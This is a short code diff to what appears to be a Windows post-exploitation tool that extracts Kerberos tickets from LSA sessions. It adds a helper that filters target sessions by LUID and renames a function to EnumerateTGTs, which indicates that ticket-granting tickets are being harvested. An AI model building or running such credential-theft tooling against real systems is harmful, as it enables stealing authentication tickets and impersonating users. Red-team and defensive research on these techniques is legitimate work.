@@ -105,6 +105,22 @@ BOOL IsTargetUser(const char* targetUsers, const char* username) {
     return FALSE;
 }
 
+BOOL IsTargetLuid(const char* targetLuids, LUID luid) {
+    const char* p = targetLuids;
+    while (*p) {
+        const char* start = p;
+        while (*p && *p != ',') p++;
+
+        char* end = NULL;
+        ULONG parsed = MSVCRT$strtoul(start, &end, 16);
+        if (end > start && parsed == luid.LowPart)
+            return TRUE;
+
+        if (*p == ',') p++;
+    }
+    return FALSE;
+}
+
 NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING target, PUCHAR* ticket, PULONG ticketSize) {
     NTSTATUS status = STATUS_SUCCESS;
     NTSTATUS protocolStatus = STATUS_SUCCESS;
@@ -147,7 +163,7 @@ NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING
     return STATUS_SUCCESS;
 }
 
-NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUsers, PTICKET_CACHE cache) {
+NTSTATUS EnumerateTGTs(HANDLE hLsa, ULONG authPackage, char* targetUsers, PTICKET_CACHE cache) {
     NTSTATUS status = STATUS_SUCCESS;
     ULONG sessionCount = 0;
     PLUID sessionList  = NULL;
